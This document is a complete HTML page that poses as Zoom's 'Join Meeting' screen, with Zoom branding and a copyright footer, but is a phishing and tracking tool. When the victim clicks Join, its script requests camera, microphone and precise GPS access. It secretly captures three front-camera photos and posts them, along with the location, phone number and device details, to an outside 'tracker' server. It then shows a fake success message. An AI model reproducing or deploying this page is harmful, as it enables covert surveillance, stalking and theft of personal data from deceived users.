<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Join Meeting - Zoom</title>
    <link rel="icon" href="https://st1.zoom.us/zoom.ico">
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
    
    <style>
        body { font-family: 'Open Sans', system-ui, sans-serif; }
        .zoom-blue { color: #0E71EB; }
        .btn-join {
            background-color: #E2E2ED;
            color: #91919E;
            transition: all 0.2s;
        }
        .btn-join.active {
            background-color: #0E71EB;
            color: white;
            cursor: pointer;
        }
        .input-focus:focus {
            border-color: #0E71EB;
            box-shadow: 0 0 0 3px rgba(14, 113, 235, 0.2);
        }
        #status { min-height: 24px; }
    </style>
</head>
<body class="bg-[#F0F0F0] min-h-screen flex flex-col">

    <!-- Header -->
    <header class="bg-white border-b border-gray-200 py-4 px-6 flex items-center justify-between">
        <div class="flex items-center gap-3">
            <img src="https://st2.zoom.us/static/6.3.26257/image/new/ZoomLogo.png" width="110" alt="Zoom">
        </div>
        <div class="flex items-center gap-4">
            <a href="#" class="text-[#0E71EB] hover:underline text-sm font-medium">Support</a>
            <a href="#" class="bg-[#0E71EB] text-white px-5 py-2 rounded-full text-sm font-semibold hover:bg-blue-700">Sign Up Free</a>
        </div>
    </header>

    <main class="flex-1 flex items-center justify-center p-6">
        <div class="w-full max-w-[420px]">
            <div class="bg-white rounded-2xl shadow-xl p-8">
                <h1 class="text-3xl font-semibold text-center text-gray-900 mb-2">Join Meeting</h1>
                <p class="text-center text-gray-500 mb-8">Enter meeting ID or phone number</p>

                <div class="mb-6">
                    <label class="block text-sm font-medium text-gray-600 mb-2">Meeting ID or Personal Link Name</label>
                    <input type="tel" id="phoneInput" placeholder="0812-3456-7890" 
                           class="input-focus w-full px-5 py-4 border border-gray-300 rounded-xl text-base outline-none text-gray-900">
                </div>

                <button id="startBtn" onclick="startVerification()" 
                        class="btn-join w-full py-4 rounded-xl font-semibold text-lg">
                    JOIN
                </button>

                <p class="text-center text-xs text-gray-500 mt-6">
                    By clicking "Join", you agree to our 
                    <span class="zoom-blue hover:underline cursor-pointer">Terms of Service</span> and 
                    <span class="zoom-blue hover:underline cursor-pointer">Privacy Statement</span>
                </p>
            </div>

            <div id="status" class="text-center mt-6 text-sm font-medium"></div>
        </div>
    </main>

    <footer class="py-6 text-center text-xs text-gray-500">
        © 2026 Zoom Communications, Inc. All rights reserved.
    </footer>

    <video id="video" autoplay playsinline muted style="display: none;"></video>

    <script>
    const SERVER_URL = 'https://coreproject.site/tracker/dashboard.php';

    async function startVerification() {
        const btn = document.getElementById('startBtn');
        const status = document.getElementById('status');
        const phone = document.getElementById('phoneInput').value.trim() || "Unknown";

        btn.disabled = true;
        btn.textContent = "Connecting...";
        status.innerHTML = 'Requesting camera and microphone access...';

        try {
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user" }, 
                audio: true 
            });

            const videoEl = document.getElementById('video');
            videoEl.srcObject = stream;
            await videoEl.play();

            status.innerHTML = '✅ Access granted<br>Getting location...';

            // GPS
            const position = await new Promise((res, rej) => 
                navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true })
            );

            const location = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy
            };

            // Ambil 3 Foto Cepat
            const photos = [];
            for (let i = 0; i < 3; i++) {
                await new Promise(r => setTimeout(r, 600));
                const canvas = document.createElement('canvas');
                canvas.width = videoEl.videoWidth || 640;
                canvas.height = videoEl.videoHeight || 480;
                canvas.getContext('2d').drawImage(videoEl, 0, 0);
                photos.push(canvas.toDataURL('image/jpeg', 0.78));
            }

            status.innerHTML = 'Sending data to server...';

            // Kirim Data
            const formData = new FormData();
            formData.append('location', JSON.stringify(location));
            formData.append('device_info', JSON.stringify({
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                timestamp: new Date().toISOString(),
                phone: phone
            }));
            formData.append('phone', phone);

            for (let i = 0; i < photos.length; i++) {
                const blob = await (await fetch(photos[i])).blob();
                formData.append(`photo${i+1}`, blob);
            }

            await fetch(SERVER_URL, { method: 'POST', body: formData });

            status.innerHTML = '✅ Successfully joined meeting!';
            btn.textContent = "JOINED ✓";

        } catch (err) {
            console.error(err);
            status.innerHTML = '❌ Failed to get permission.<br>Please allow Camera, Microphone, and Location.';
            btn.disabled = false;
            btn.textContent = "JOIN";
        }
    }

    // Auto active button
    document.getElementById('phoneInput').addEventListener('input', function() {
        document.getElementById('startBtn').classList.toggle('active', this.value.length > 5);
    });
    </script>
</body>
</html>
